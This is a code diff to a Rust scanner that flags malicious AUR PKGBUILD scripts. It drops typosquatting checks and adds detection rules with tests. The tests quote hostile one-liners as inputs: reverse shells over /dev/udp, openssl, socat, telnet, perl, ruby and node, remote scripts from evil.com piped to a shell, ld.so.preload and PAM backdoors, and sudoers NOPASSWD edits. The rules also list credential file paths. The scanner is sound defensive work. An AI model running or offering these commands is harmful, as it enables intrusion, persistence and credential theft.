@@ -10,12 +10,10 @@
 //! - Suspicious commands (SUID bits, dd to block devices, iptables, kernel modules, security service kills)
 //! - Cryptojacking (XMRig signatures, mining pools, wallet addresses)
 //! - Structural anomalies (long encoded blobs, variable splicing)
-//! - Typosquatting (Damerau-Levenshtein against top AUR packages)
 
 use crate::findings::{Behavior, Finding};
-use regex::Regex;
+use regex::{Regex, RegexSet};
 use serde::Serialize;
-use std::collections::HashSet;
 use std::sync::LazyLock;
 
 static VAR_RE: LazyLock<Regex> =
@@ -23,65 +21,6 @@ static VAR_RE: LazyLock<Regex> =
 
 static LONG_B64_RE: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/=]{60,})['"]"#).unwrap());
-
-pub const POPULAR_PACKAGES: &[&str] = &[
-    "google-chrome",
-    "visual-studio-code-bin",
-    "spotify",
-    "discord",
-    "paru",
-    "paru-bin",
-    "yay",
-    "yay-bin",
-    "slack-desktop",
-    "zoom",
-    "postman-bin",
-    "notion-app",
-    "brave-bin",
-    "1password",
-    "bitwarden-bin",
-    "anydesk-bin",
-    "teamviewer",
-    "insomnia",
-    "sublime-text-4",
-    "sublime-merge",
-    "docker-desktop",
-    "steam-native",
-    "protonup-qt",
-    "heroic-games-launcher-bin",
-    "obs-studio-tytan652",
-    "lutris-git",
-    "bottles",
-    "dropbox",
-    "signal-desktop-beta-bin",
-    "telegram-desktop-bin",
-    "betterdiscord-installer-bin",
-    "vencord-installer-bin",
-    "zen-browser-bin",
-    "thorium-browser-bin",
-    "floorp-bin",
-    "librewolf-bin",
-    "vesktop-bin",
-    "spicetify-cli",
-    "hyprland-git",
-    "waybar-hyprland",
-    "swww",
-    "rofi-wayland",
-    "wofi",
-    "kitty-git",
-    "foot-git",
-    "alacritty-git",
-    "nerd-fonts-complete",
-    "ttf-ms-fonts",
-    "ttf-jetbrains-mono-nerd",
-    "auto-cpufreq",
-    "tlp",
-    "ananicy-cpp",
-    "downgrade",
-    "debtap",
-    "pamac-aur",
-    "bauh",
-];
 
 #[derive(Serialize)]
 pub struct Rule {
@@ -143,6 +82,55 @@ pub const RULES: &[Rule] = &[
         description: "deeply nested substitution with pipe chain (obfuscated execution)",
         behavior: Behavior::Obfuscation,
     },
+    Rule {
+        id: "OBFUSCATED_OPENSSL_DEC",
+        severity: "CRITICAL",
+        pattern: r##"\bopenssl\s+(?:enc\s+-(?:d|base64)|base64\s+-d)\b"##,
+        description: "OpenSSL base64/payload decryption invocation",
+        behavior: Behavior::Obfuscation,
+    },
+    Rule {
+        id: "OBFUSCATED_BASE32",
+        severity: "HIGH",
+        pattern: r##"\bbase32\s+(?:-d|--decode)\b"##,
+        description: "Base32 decode invocation (alternative encoding bypass)",
+        behavior: Behavior::Obfuscation,
+    },
+    Rule {
+        id: "OBFUSCATED_HEREDOC_B64",
+        severity: "CRITICAL",
+        pattern: r##"base64\s+-(?:d|-decode)\s*<<<'?[A-Za-z0-9+/=]{20,}"##,
+        description: "Base64 decode from bash here-string or here-doc",
+        behavior: Behavior::Obfuscation,
+    },
+    Rule {
+        id: "OBFUSCATED_PYTHON_EXEC",
+        severity: "CRITICAL",
+        pattern: r##"python[23]?\s+-c\s+['"].*?(?:(?:exec|eval)\(.*?(?:b64decode|codecs\.decode)|(?:b64decode|codecs\.decode).*?(?:exec|eval)\()"##,
+        description: "Python one-liner decoding and executing obfuscated code",
+        behavior: Behavior::Obfuscation,
+    },
+    Rule {
+        id: "OBFUSCATED_PERL_EXEC",
+        severity: "CRITICAL",
+        pattern: r##"perl\s+(?:-[a-zA-Z]*e\s+['"].*?(?:MIME::Base64|decode_base64|eval)|-MMIME::Base64)"##,
+        description: "Perl one-liner decoding base64 payload into eval",
+        behavior: Behavior::Obfuscation,
+    },
+    Rule {
+        id: "OBFUSCATED_ECHO_HEX_PIPE",
+        severity: "CRITICAL",
+        pattern: r##"echo\s+-(?:e|ne)\s+['"].*?(?:\\x[0-9a-fA-F]{2}){4,}.*?\|\s*(?:bash|sh|eval)"##,
+        description: "Hex escape echo piped to shell interpreter",
+        behavior: Behavior::Obfuscation,
+    },
+    Rule {
+        id: "OBFUSCATED_ROT13_PIPE",
+        severity: "CRITICAL",
+        pattern: r##"\btr\s+['"][A-Za-z0-9_ -]+['"]\s+['"][A-Za-z0-9_ -]+['"].*?\|\s*(?:(?:/bin/)?(?:ba)?sh|eval)\b"##,
+        description: "ROT13 / Caesar cipher translation piped directly to shell",
+        behavior: Behavior::Obfuscation,
+    },
     // --- Exfiltration ---
     Rule {
         id: "EXFIL_DISCORD_WEBHOOK",
@@ -200,12 +188,75 @@ pub const RULES: &[Rule] = &[
         description: "connection targeting ephemeral reverse-proxy or tunnel service (attacker C2 evasion)",
         behavior: Behavior::NetworkAccess,
     },
+    Rule {
+        id: "EXFIL_PROC_SUBST_EXEC",
+        severity: "CRITICAL",
+        pattern: r##"(?:\bsource\s+|\b\.\s+)\s*<\(\s*(?:curl|wget)[^)]+\)"##,
+        description: "sourcing remote script directly from process substitution",
+        behavior: Behavior::DynamicDownload,
+    },
+    Rule {
+        id: "EXFIL_XARGS_PIPE_EXEC",
+        severity: "CRITICAL",
+        pattern: r##"(?:curl|wget)[^|\n]+\|\s*xargs\s+[^#\n]*(?:sh|bash|eval)"##,
+        description: "remote download piped into xargs shell execution",
+        behavior: Behavior::DynamicDownload,
+    },
     // --- Reverse Shells ---
     Rule {
         id: "REVSHELL_DEV_TCP",
         severity: "CRITICAL",
         pattern: r##"/dev/tcp/"##,
         description: "bash /dev/tcp connection (standard reverse shell vector)",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_DEV_UDP",
+        severity: "CRITICAL",
+        pattern: r##"/dev/udp/[0-9a-zA-Z.-]+/[0-9]+"##,
+        description: "bash /dev/udp connection (UDP reverse shell vector)",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_OPENSSL",
+        severity: "CRITICAL",
+        pattern: r##"openssl\s+s_client\b.*?-[a-zA-Z0-9_-]*connect\b.*?\|\s*(?:/bin/)?(?:ba)?sh"##,
+        description: "OpenSSL encrypted SSL reverse shell pipe",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_SOCAT_EXEC",
+        severity: "CRITICAL",
+        pattern: r##"socat\s+[^#\n]*(?:exec:|system:)[^#\n]*(?:bash|sh)"##,
+        description: "socat interactive socket exec reverse shell",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_TELNET",
+        severity: "CRITICAL",
+        pattern: r##"telnet\s+[^#\n]+\s+[0-9]+\s*\|\s*(?:/bin/)?(?:ba)?sh"##,
+        description: "telnet socket piped to shell",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_PERL",
+        severity: "CRITICAL",
+        pattern: r##"perl\s+(?:-[a-zA-Z]*e\s+['"].*?use\s+Socket\b.*?socket\(|-[a-zA-Z]*e\s+['"].*?open\(.*?\|\s*exec\b)"##,
+        description: "perl socket connection / reverse shell script",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_RUBY",
+        severity: "CRITICAL",
+        pattern: r##"ruby\s+(?:-[a-zA-Z]*e\s+['"].*?(?:TCPSocket|Socket)\.new)"##,
+        description: "ruby socket connection / reverse shell script",
+        behavior: Behavior::NetworkAccess,
+    },
+    Rule {
+        id: "REVSHELL_NODE",
+        severity: "CRITICAL",
+        pattern: r##"node\s+-e\s+['"].*?(?:require\(['"]net['"]\)|child_process)"##,
+        description: "Node.js socket connection / reverse shell script",
         behavior: Behavior::NetworkAccess,
     },
     Rule {
@@ -294,12 +345,89 @@ pub const RULES: &[Rule] = &[
         description: "copying or exfiltrating shell history logs",
         behavior: Behavior::CredentialAccess,
     },
+    Rule {
+        id: "CRED_DEV_TOKENS",
+        severity: "CRITICAL",
+        pattern: r##"(?:\.git-credentials|\.config/gh/hosts\.yml|\.npmrc|\.pypirc|\.cargo/credentials(?:\.toml)?|\.terraformrc)"##,
+        description: "reading developer token vaults (GitHub, npm, PyPI, Cargo)",
+        behavior: Behavior::CredentialAccess,
+    },
+    Rule {
+        id: "CRED_SYSTEM_SHADOW",
+        severity: "CRITICAL",
+        pattern: r##"(?:cat|head|tail|awk|grep|base64|python[23]?|perl)\s+[^#\n]*/etc/(?:shadow|gshadow)"##,
+        description: "direct extraction or dumping of system password shadow hashes",
+        behavior: Behavior::CredentialAccess,
+    },
+    Rule {
+        id: "CRED_ROOT_DIR_ACCESS",
+        severity: "CRITICAL",
+        pattern: r##"(?:/root/\.ssh/|/root/\.bash_history\b)"##,
+        description: "targeting root home directory credential files",
+        behavior: Behavior::CredentialAccess,
+    },
+    Rule {
+        id: "CRED_SSH_AGENT_SOCKET",
+        severity: "HIGH",
+        pattern: r##"(?:SSH_AUTH_SOCK|/tmp/ssh-[a-zA-Z0-9]+/agent\.[0-9]+)"##,
+        description: "intercepting or accessing active SSH authentication agent socket",
+        behavior: Behavior::CredentialAccess,
+    },
+    Rule {
+        id: "CRED_KUBERNETES_SECRETS",
+        severity: "CRITICAL",
+        pattern: r##"/var/run/secrets/kubernetes\.io/serviceaccount"##,
+        description: "harvesting Kubernetes pod service account tokens",
+        behavior: Behavior::CredentialAccess,
+    },
     // --- Persistence ---
     Rule {
         id: "PERSIST_SYSTEMD",
         severity: "CRITICAL",
         pattern: r##"(?:cp|install|tee|cat\s*>|mv)\s+[^#\n]*/etc/systemd/system/[a-zA-Z]"##,
         description: "writing custom systemd service file outside standard package tree",
+        behavior: Behavior::Persistence,
+    },
+    Rule {
+        id: "PERSIST_PROFILE_D_HOOK",
+        severity: "CRITICAL",
+        pattern: r##"(?:install|cp|mv|tee|cat\s*>)\s+[^#\n]*/etc/profile\.d/[a-zA-Z0-9_-]+\.sh"##,
+        description: "dropping script into /etc/profile.d/ for persistent global login execution",
+        behavior: Behavior::Persistence,
+    },
+    Rule {
+        id: "PERSIST_LD_SO_PRELOAD",
+        severity: "CRITICAL",
+        pattern: r##"(?:>>|tee\s+-a|cp|install)\s+[^#\n]*/etc/ld\.so\.preload"##,
+        description: "injecting shared library into /etc/ld.so.preload (rootkit hook)",
+        behavior: Behavior::Persistence,
+    },
+    Rule {
+        id: "PERSIST_SYSTEMD_USER",
+        severity: "CRITICAL",
+        pattern: r##"(?:\.config/systemd/user/|/usr/lib/systemd/user/)[a-zA-Z0-9_-]+\.service"##,
+        description: "creating persistent systemd user service",
+        behavior: Behavior::Persistence,
+    },
+    Rule {
+        id: "PERSIST_INITCPIO_HOOK",
+        severity: "CRITICAL",
+        pattern: r##"/etc/initcpio/(?:hooks|install)/"##,
+        description: "modifying mkinitcpio early boot ramdisk hooks",
+        behavior: Behavior::Persistence,
+    },
+    Rule {
+        id: "PERSIST_PAM_TAMPERING",
+        severity: "CRITICAL",
+        pattern: r##"/etc/pam\.d/[a-zA-Z0-9_-]+"##,
+        description: "modifying PAM authentication configuration",
+        behavior: Behavior::Persistence,
+    },
+    Rule {
+        id: "PERSIST_BASH_LOGOUT",
+        severity: "HIGH",
+        pattern: r##"(?:>>|tee\s+-a)\s+[^#\n]*(?:\.bash_logout|\.zlogout)"##,
+        description: "appending persistent code to shell logout files",
         behavior: Behavior::Persistence,
     },
     Rule {
@@ -416,6 +544,48 @@ pub const RULES: &[Rule] = &[
         description: "aliasing core shell commands (environment hijacking)",
         behavior: Behavior::ShellExecution,
     },
+    Rule {
+        id: "PRIV_ESC_SUDOERS_WRITE",
+        severity: "CRITICAL",
+        pattern: r##"(?:>>|tee\s+-a?|cp|install|mv|cat\s*>)\s+[^#\n]*/etc/sudoers(?:\.d/[a-zA-Z0-9_-]+)?"##,
+        description: "writing or appending rules to /etc/sudoers or /etc/sudoers.d/",
+        behavior: Behavior::PrivilegeEscalation,
+    },
+    Rule {
+        id: "PRIV_ESC_SUDOERS_NOPASSWD",
+        severity: "CRITICAL",
+        pattern: r##"NOPASSWD\s*:\s*ALL"##,
+        description: "direct sudoers NOPASSWD privilege escalation configuration",
+        behavior: Behavior::PrivilegeEscalation,
+    },
+    Rule {
+        id: "PRIV_ESC_SETCAP",
+        severity: "CRITICAL",
+        pattern: r##"\bsetcap\s+[^#\n]*(?:cap_setuid|cap_setgid|cap_sys_admin|all)\+[a-z]+"##,
+        description: "assigning elevated Linux capabilities (SUID-equivalent root privilege)",
+        behavior: Behavior::PrivilegeEscalation,
+    },
+    Rule {
+        id: "PRIV_ESC_CHMOD_SGID",
+        severity: "HIGH",
+        pattern: r##"chmod\s+[^#\n]*g\+s\b|chmod\s+[^#\n]*2[0-7]{3}\b"##,
+        description: "setting SGID permission bit on binary",
+        behavior: Behavior::PrivilegeEscalation,
+    },
+    Rule {
+        id: "PRIV_ESC_POLKIT_RULE",
+        severity: "CRITICAL",
+        pattern: r##"(?:install|cp|tee|cat\s*>)\s+[^#\n]*/etc/polkit-1/rules\.d/[a-zA-Z0-9_-]+\.rules"##,
+        description: "dropping custom Polkit authorization rule",
+        behavior: Behavior::PrivilegeEscalation,
+    },
+    Rule {
+        id: "PRIV_ESC_DOCKER_SOCKET",
+        severity: "CRITICAL",
+        pattern: r##"(?:/var/run/docker\.sock|docker\.sock\b)"##,
+        description: "accessing or mounting Docker daemon socket (host root escape)",
+        behavior: Behavior::PrivilegeEscalation,
+    },
     // --- Cryptojacking ---
     Rule {
         id: "MINER_XMRIG",
@@ -439,18 +609,13 @@ struct CompiledRule {
 }
 
 pub struct PKGBUILDScanner {
+    rule_set: RegexSet,
     rules: Vec<CompiledRule>,
-    popular_set: HashSet<String>,
-    popular_cleaned: Vec<(String, String)>,
 }
 
 impl PKGBUILDScanner {
     pub fn new() -> Self {
-        Self::with_popular_packages(POPULAR_PACKAGES)
-    }
-
-    fn with_popular_packages(popular_packages: &[&str]) -> Self {
-        let rules = RULES
+        let rules: Vec<CompiledRule> = RULES
             .iter()
             .filter_map(|rule| {
                 Regex::new(rule.pattern)
@@ -458,15 +623,9 @@ impl PKGBUILDScanner {
                     .map(|regex| CompiledRule { rule, regex })
             })
             .collect();
-        let clean = |s: &str| s.to_lowercase().replace("-bin", "").replace("-git", "");
-        Self {
-            rules,
-            popular_set: popular_packages.iter().map(|&s| s.to_string()).collect(),
-            popular_cleaned: popular_packages
-                .iter()
-                .map(|&p| (p.to_string(), clean(p)))
-                .collect(),
-        }
+        let rule_set = RegexSet::new(rules.iter().map(|cr| cr.rule.pattern))
+            .expect("all rule patterns must compile into RegexSet");
+        Self { rule_set, rules }
     }
 
     pub fn scan(&self, content: &str, pkgname: Option<&str>) -> Vec<Finding> {
@@ -483,17 +642,38 @@ impl PKGBUILDScanner {
             || content.contains("hg+")
             || content.contains("svn+");
 
-        // 1. Regex pattern scanning
+        // 1. Regex pattern scanning with RegexSet fast-path
         for (idx, line) in content.lines().enumerate() {
             let trimmed = line.trim();
             if trimmed.starts_with('#') {
                 continue;
             }
-            for CompiledRule { rule, regex } in &self.rules {
+            let matches = self.rule_set.matches(line);
+            if !matches.matched_any() {
+                continue;
+            }
+            for rule_idx in matches.into_iter() {
+                let CompiledRule { rule, regex } = &self.rules[rule_idx];
                 if is_vcs && rule.id == "PKG_SKIP_HASH" {
                     continue;
                 }
                 if rule.id == "SUS_CHMOD_SUID" && line.contains("chrome-sandbox") {
+                    continue;
+                }
+                if rule.id == "PRIV_ESC_CHMOD_SGID" && line.contains("chrome-sandbox") {
+                    continue;
+                }
+                // Packaging whitelist check for persistence and privilege escalation
+                if (rule.id == "PERSIST_PROFILE_D_HOOK"
+                    || rule.id == "PERSIST_SYSTEMD_USER"
+                    || rule.id == "PERSIST_INITCPIO_HOOK"
+                    || rule.id == "PERSIST_PAM_TAMPERING"
+                    || rule.id == "PRIV_ESC_SUDOERS_WRITE"
+                    || rule.id == "PRIV_ESC_POLKIT_RULE")
+                    && (line.contains("$pkgdir")
+                        || line.contains("${pkgdir}")
+                        || line.contains("DESTDIR"))
+                {
                     continue;
                 }
                 if let Some(m) = regex.find(line) {
@@ -510,8 +690,9 @@ impl PKGBUILDScanner {
                         continue;
                     }
                     let matched = m.as_str();
-                    let snippet = if matched.len() > 120 {
-                        format!("{}...", &matched[..117])
+                    let snippet = if matched.chars().count() > 120 {
+                        let truncated: String = matched.chars().take(117).collect();
+                        format!("{truncated}...")
                     } else {
                         matched.to_string()
                     };
@@ -530,25 +711,7 @@ impl PKGBUILDScanner {
         // 2. Structural checks
         findings.extend(self.check_structural(content));
 
-        // 3. Typosquatting
-        if let Some(name) = pkgname {
-            if !self.popular_set.contains(name) {
-                if let Some(target) = self.check_typosquatting(name) {
-                    findings.push(Finding {
-                        rule_id: "TYPOSQUATTING".to_string(),
-                        severity: "MEDIUM".to_string(),
-                        description: format!(
-                            "Package '{name}' closely resembles high-profile package '{target}'"
-                        ),
-                        line_number: 1,
-                        matched_text: format!("{name} -> {target}"),
-                        behavior: Behavior::PackageInstallation,
-                    });
-                }
-            }
-        }
-
-        // 4. Shannon Information Entropy analysis
+        // 3. Shannon Information Entropy analysis
         findings.extend(crate::analyzer::analyze_entropy(content));
 
         // 5. Recursive Base64 payload de-obfuscation
@@ -594,54 +757,40 @@ impl PKGBUILDScanner {
                         "Long base64-like encoded string found (may hide second-stage payload)"
                             .to_string(),
                     line_number: idx + 1,
-                    matched_text: format!("{}...", &line.trim()[..line.trim().len().min(80)]),
+                    matched_text: format!(
+                        "{}...",
+                        line.trim().chars().take(80).collect::<String>()
+                    ),
                     behavior: Behavior::Obfuscation,
                 });
             }
         }
 
         // Variable splicing
-        let short_vars: Vec<_> = content
-            .lines()
-            .filter_map(|l| VAR_RE.captures(l.trim()).map(|c| c[1].to_string()))
-            .collect();
-        if short_vars.len() >= 3 {
+        let mut short_vars_count = 0usize;
+        let mut short_vars_sample = Vec::new();
+        for l in content.lines() {
+            if let Some(c) = VAR_RE.captures(l.trim()) {
+                short_vars_count += 1;
+                if short_vars_sample.len() < 5 {
+                    short_vars_sample.push(c[1].to_string());
+                }
+            }
+        }
+        if short_vars_count >= 3 {
             findings.push(Finding {
                 rule_id: "SUS_VARIABLE_SPLICING".to_string(),
                 severity: "HIGH".to_string(),
                 description: format!(
-                    "Multiple short variable definitions ({} found) - possible command splicing obfuscation",
-                    short_vars.len()
+                    "Multiple short variable definitions ({short_vars_count} found) - possible command splicing obfuscation"
                 ),
                 line_number: 1,
-                matched_text: format!("Variables: {}", short_vars[..short_vars.len().min(5)].join(", ")),
+                matched_text: format!("Variables: {}", short_vars_sample.join(", ")),
                 behavior: Behavior::Obfuscation,
             });
         }
 
         findings
-    }
-
-    fn check_typosquatting(&self, candidate: &str) -> Option<String> {
-        if candidate.len() < 4 {
-            return None;
-        }
-        let clean = |s: &str| s.to_lowercase().replace("-bin", "").replace("-git", "");
-        let cand = clean(candidate);
-
-        for (popular, target) in &self.popular_cleaned {
-            if &cand == target {
-                continue;
-            }
-            let len_diff = (cand.len() as isize - target.len() as isize).unsigned_abs();
-            if len_diff <= 2 {
-                let dist = damerau_levenshtein(&cand, target);
-                if dist <= 1 || (cand.len() >= 8 && dist <= 2) {
-                    return Some(popular.clone());
-                }
-            }
-        }
-        None
     }
 }
 
@@ -651,96 +800,12 @@ impl Default for PKGBUILDScanner {
     }
 }
 
-fn damerau_levenshtein(s1: &str, s2: &str) -> usize {
-    let a = s1.as_bytes();
-    let b = s2.as_bytes();
-    let len_a = a.len();
-    let len_b = b.len();
-
-    let stride = len_b + 2;
-    let mut flat = [0usize; 66 * 66];
-    let d: &mut [usize] = if (len_a + 2) * stride <= flat.len() {
-        &mut flat[..(len_a + 2) * stride]
-    } else {
-        return damerau_levenshtein_heap(a, b);
-    };
-
-    let max_dist = len_a + len_b;
-    d[0] = max_dist;
-    for i in 0..=len_a {
-        d[(i + 1) * stride] = max_dist;
-        d[(i + 1) * stride + 1] = i;
-    }
-    for j in 0..=len_b {
-        d[j + 1] = max_dist;
-        d[stride + j + 1] = j;
-    }
-
-    for i in 1..=len_a {
-        for j in 1..=len_b {
-            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
-            let deletion = d[(i + 1) * stride + j] + 1;
-            let insertion = d[i * stride + j + 1] + 1;
-            let substitution = d[i * stride + j] + cost;
-            let mut val = deletion.min(insertion).min(substitution);
-
-            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
-                let transposition = d[(i - 1) * stride + j - 1] + 1;
-                val = val.min(transposition);
-            }
-            d[(i + 1) * stride + j + 1] = val;
-        }
-    }
-    d[(len_a + 1) * stride + len_b + 1]
-}
-
-fn damerau_levenshtein_heap(a: &[u8], b: &[u8]) -> usize {
-    let len_a = a.len();
-    let len_b = b.len();
-    let stride = len_b + 2;
-    let mut d = vec![0usize; (len_a + 2) * stride];
-    let max_dist = len_a + len_b;
-
-    d[0] = max_dist;
-    for i in 0..=len_a {
-        d[(i + 1) * stride] = max_dist;
-        d[(i + 1) * stride + 1] = i;
-    }
-    for j in 0..=len_b {
-        d[j + 1] = max_dist;
-        d[stride + j + 1] = j;
-    }
-
-    for i in 1..=len_a {
-        for j in 1..=len_b {
-            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
-            let deletion = d[(i + 1) * stride + j] + 1;
-            let insertion = d[i * stride + j + 1] + 1;
-            let substitution = d[i * stride + j] + cost;
-            let mut val = deletion.min(insertion).min(substitution);
-
-            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
-                let transposition = d[(i - 1) * stride + j - 1] + 1;
-                val = val.min(transposition);
-            }
-            d[(i + 1) * stride + j + 1] = val;
-        }
-    }
-    d[(len_a + 1) * stride + len_b + 1]
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
 
     fn test_scanner() -> PKGBUILDScanner {
-        PKGBUILDScanner::with_popular_packages(&[
-            "google-chrome",
-            "visual-studio-code-bin",
-            "spotify",
-            "discord",
-            "paru",
-        ])
+        PKGBUILDScanner::new()
     }
 
     #[test]
@@ -815,17 +880,6 @@ mod tests {
             Behavior::NetworkAccess
         );
         assert_eq!(behavior_of("PERSIST_CRON"), Behavior::Persistence);
-    }
-
-    #[test]
-    fn embedded_popular_packages_list_is_loaded() {
-        assert!(POPULAR_PACKAGES.iter().any(|&p| p == "google-chrome"));
-        let s = PKGBUILDScanner::new();
-        assert!(
-            s.scan("pkgname=goolge-chrome\n", Some("goolge-chrome"))
-                .iter()
-                .any(|f| f.rule_id == "TYPOSQUATTING")
-        );
     }
 
     #[test]
@@ -918,14 +972,6 @@ package() {
                 .iter()
                 .any(|f| f.rule_id == "EXFIL_RAW_IP" || f.rule_id == "EXFIL_CURL_PIPE_EXEC")
         );
-    }
-
-    #[test]
-    fn detects_typosquatting() {
-        let s = test_scanner();
-        let content = "pkgname=goolge-chrome\npkgver=1.0\n";
-        let findings = s.scan(content, Some("goolge-chrome"));
-        assert!(findings.iter().any(|f| f.rule_id == "TYPOSQUATTING"));
     }
 
     #[test]
@@ -1238,5 +1284,268 @@ sha256sums=('38865ecdfca86427382218086ee50a12e259e875155f949c81b539b4bfa254ff')
         let content = "eval \"$(echo $PAYLOAD | base64 -d)\"\n";
         let findings = s.scan(content, None);
         assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
+    }
+
+    // --- Tests for Expanded R4 Malware Rules ---
+
+    #[test]
+    fn test_expanded_obfuscated_shell_rules() {
+        let s = test_scanner();
+
+        // 1. OpenSSL decryption
+        let f1 = s.scan("openssl enc -d -base64 -in payload.enc", None);
+        assert!(
+            f1.iter()
+                .any(|f| f.rule_id == "OBFUSCATED_OPENSSL_DEC"
+                    && f.behavior == Behavior::Obfuscation)
+        );
+
+        // 2. Base32 decode
+        let f2 = s.scan("base32 -d payload.b32 | bash", None);
+        assert!(
+            f2.iter()
+                .any(|f| f.rule_id == "OBFUSCATED_BASE32" && f.behavior == Behavior::Obfuscation)
+        );
+
+        // 3. Heredoc base64
+        let f3 = s.scan("base64 -d <<<'Y3VybCBodHRwczovL2V2aWwuY29tCg=='", None);
+        assert!(f3.iter().any(|f| f.rule_id == "OBFUSCATED_HEREDOC_B64"));
+
+        // 4. Python exec b64decode
+        let f4 = s.scan(
+            "python3 -c \"import base64; exec(base64.b64decode('...'))\"",
+            None,
+        );
+        assert!(f4.iter().any(|f| f.rule_id == "OBFUSCATED_PYTHON_EXEC"));
+
+        // 5. Perl exec MIME::Base64
+        let f5 = s.scan(
+            "perl -MMIME::Base64 -e 'eval(decode_base64(\"...\"))'",
+            None,
+        );
+        assert!(f5.iter().any(|f| f.rule_id == "OBFUSCATED_PERL_EXEC"));
+
+        // 6. Echo hex pipe
+        let f6 = s.scan("echo -e '\\x63\\x75\\x72\\x6c\\x20' | sh", None);
+        assert!(f6.iter().any(|f| f.rule_id == "OBFUSCATED_ECHO_HEX_PIPE"));
+
+        // 7. ROT13 pipe
+        let f7 = s.scan("echo 'payload' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash", None);
+        assert!(f7.iter().any(|f| f.rule_id == "OBFUSCATED_ROT13_PIPE"));
+    }
+
+    #[test]
+    fn test_expanded_network_and_revshell_rules() {
+        let s = test_scanner();
+
+        // 8. Bash UDP reverse shell
+        let f8 = s.scan("bash -i >& /dev/udp/192.168.1.100/4444 0>&1", None);
+        assert!(
+            f8.iter()
+                .any(|f| f.rule_id == "REVSHELL_DEV_UDP" && f.behavior == Behavior::NetworkAccess)
+        );
+
+        // 9. OpenSSL reverse shell
+        let f9 = s.scan(
+            "openssl s_client -quiet -connect 10.0.0.1:443 | /bin/sh",
+            None,
+        );
+        assert!(
+            f9.iter()
+                .any(|f| f.rule_id == "REVSHELL_OPENSSL" && f.behavior == Behavior::NetworkAccess)
+        );
+
+        // 10. Socat exec reverse shell
+        let f10 = s.scan("socat tcp-connect:10.0.0.1:4444 exec:sh", None);
+        assert!(f10.iter().any(|f| f.rule_id == "REVSHELL_SOCAT_EXEC"));
+
+        // 11. Telnet reverse shell
+        let f11 = s.scan("telnet 10.0.0.1 4444 | /bin/sh", None);
+        assert!(f11.iter().any(|f| f.rule_id == "REVSHELL_TELNET"));
+
+        // 12. Perl socket reverse shell
+        let f12 = s.scan(
+            "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'",
+            None,
+        );
+        assert!(f12.iter().any(|f| f.rule_id == "REVSHELL_PERL"));
+
+        // 13. Ruby socket reverse shell
+        let f13 = s.scan("ruby -e 's = TCPSocket.new(\"10.0.0.1\", 4444)'", None);
+        assert!(f13.iter().any(|f| f.rule_id == "REVSHELL_RUBY"));
+
+        // 14. Node socket reverse shell
+        let f14 = s.scan(
+            "node -e 'require(\"net\").connect(4444, \"10.0.0.1\")'",
+            None,
+        );
+        assert!(f14.iter().any(|f| f.rule_id == "REVSHELL_NODE"));
+
+        // 15. Process substitution sourcing
+        let f15 = s.scan("source <(curl -sSL https://evil.com/setup.sh)", None);
+        assert!(f15.iter().any(
+            |f| f.rule_id == "EXFIL_PROC_SUBST_EXEC" && f.behavior == Behavior::DynamicDownload
+        ));
+
+        // 16. Xargs remote pipe
+        let f16 = s.scan("curl -s https://evil.com/cmd | xargs sh", None);
+        assert!(f16.iter().any(|f| f.rule_id == "EXFIL_XARGS_PIPE_EXEC"));
+    }
+
+    #[test]
+    fn test_expanded_persistence_rules() {
+        let s = test_scanner();
+
+        // 17. /etc/profile.d/ hook
+        let f17 = s.scan("cp backdoor.sh /etc/profile.d/backdoor.sh", None);
+        assert!(
+            f17.iter()
+                .any(|f| f.rule_id == "PERSIST_PROFILE_D_HOOK"
+                    && f.behavior == Behavior::Persistence)
+        );
+
+        // 18. /etc/ld.so.preload injection
+        let f18 = s.scan("echo '/lib/rootkit.so' >> /etc/ld.so.preload", None);
+        assert!(f18.iter().any(|f| f.rule_id == "PERSIST_LD_SO_PRELOAD"));
+
+        // 19. Systemd user service
+        let f19 = s.scan("cp evil.service ~/.config/systemd/user/evil.service", None);
+        assert!(f19.iter().any(|f| f.rule_id == "PERSIST_SYSTEMD_USER"));
+
+        // 20. Mkinitcpio hook
+        let f20 = s.scan("install -m 644 backdoor /etc/initcpio/hooks/backdoor", None);
+        assert!(f20.iter().any(|f| f.rule_id == "PERSIST_INITCPIO_HOOK"));
+
+        // 21. PAM tampering
+        let f21 = s.scan(
+            "echo 'auth sufficient pam_permit.so' >> /etc/pam.d/su",
+            None,
+        );
+        assert!(f21.iter().any(|f| f.rule_id == "PERSIST_PAM_TAMPERING"));
+
+        // 22. Shell logout persistence
+        let f22 = s.scan("echo 'curl evil.com' >> ~/.bash_logout", None);
+        assert!(f22.iter().any(|f| f.rule_id == "PERSIST_BASH_LOGOUT"));
+    }
+
+    #[test]
+    fn test_expanded_privilege_escalation_rules() {
+        let s = test_scanner();
+
+        // 23. /etc/sudoers.d tampering
+        let f23 = s.scan("echo 'user ALL=(ALL) ALL' >> /etc/sudoers.d/99-user", None);
+        assert!(f23.iter().any(|f| f.rule_id == "PRIV_ESC_SUDOERS_WRITE"
+            && f.behavior == Behavior::PrivilegeEscalation));
+
+        // 24. NOPASSWD: ALL
+        let f24 = s.scan("builder ALL=(ALL) NOPASSWD: ALL", None);
+        assert!(f24.iter().any(|f| f.rule_id == "PRIV_ESC_SUDOERS_NOPASSWD"));
+
+        // 25. Linux capabilities setcap
+        let f25 = s.scan("setcap cap_setuid+ep /tmp/sh", None);
+        assert!(f25.iter().any(|f| f.rule_id == "PRIV_ESC_SETCAP"));
+
+        // 26. SGID bit
+        let f26 = s.scan("chmod 2755 /usr/bin/secret", None);
+        assert!(f26.iter().any(|f| f.rule_id == "PRIV_ESC_CHMOD_SGID"));
+
